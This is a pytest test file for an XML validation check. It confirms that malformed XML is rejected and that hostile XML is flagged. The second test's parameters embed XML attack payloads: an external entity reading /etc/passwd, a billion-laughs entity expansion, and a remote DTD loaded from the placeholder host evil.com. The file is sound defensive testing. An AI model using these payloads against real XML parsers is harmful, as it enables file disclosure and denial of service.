"""
Dangerous XML Error Checks
"""

import pytest
from common_layer.exceptions.xml_file_exceptions import DangerousXML, XMLSyntaxError
from file_validation.app.xml_checks import dangerous_xml_check


@pytest.mark.parametrize(
    "xml_content",
    [
        pytest.param(
            b"Not an XML file at all",
            id="Not XML",
        ),
        pytest.param(
            b"<?xml version='1.0'?><root>malformed<root>",
            id="Malformed XML",
        ),
        pytest.param(
            b"""<?xml version="1.0" encoding="UTF-8"?>
            <root><unclosed>""",
            id="Unclosed Tag",
        ),
        pytest.param(
            b"""<?xml version="1.0" encoding="UTF-8"?>
            <root><child></wrong_tag></root>""",
            id="Mismatched Tags",
        ),
    ],
)
def test_xml_syntax_errors(create_xml_file, xml_content: bytes) -> None:
    """
    Test handling of various XML syntax errors.

    """
    xml_file = create_xml_file(xml_content)
    with pytest.raises(XMLSyntaxError):
        dangerous_xml_check(xml_file, "test.xml")


@pytest.mark.parametrize(
    "xml_content",
    [
        pytest.param(
            b"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <root>&xxe;</root>""",
            id="External Entity Attack",
        ),
        pytest.param(
            b"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test [<!ENTITY test "test">]>
            <root>&test;</root>""",
            id="Entity Expansion",
        ),
        pytest.param(
            b"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE lolz [
                <!ENTITY lol "lol">
                <!ENTITY lol1 "&lol;&lol;&lol;&lol;">
                <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;">
            ]>
            <root>&lol2;</root>""",
            id="Billion Laughs Attack",
        ),
        pytest.param(
            b"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
                <!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">
                %remote;
            ]>
            <root>test</root>""",
            id="Remote DTD Loading",
        ),
    ],
)
def test_dangerous_xml_detection(create_xml_file, xml_content: bytes) -> None:
    """
    Test detection of dangerous XML patterns.
    """
    xml_file = create_xml_file(xml_content)
    with pytest.raises(DangerousXML):
        dangerous_xml_check(xml_file, "test.xml")
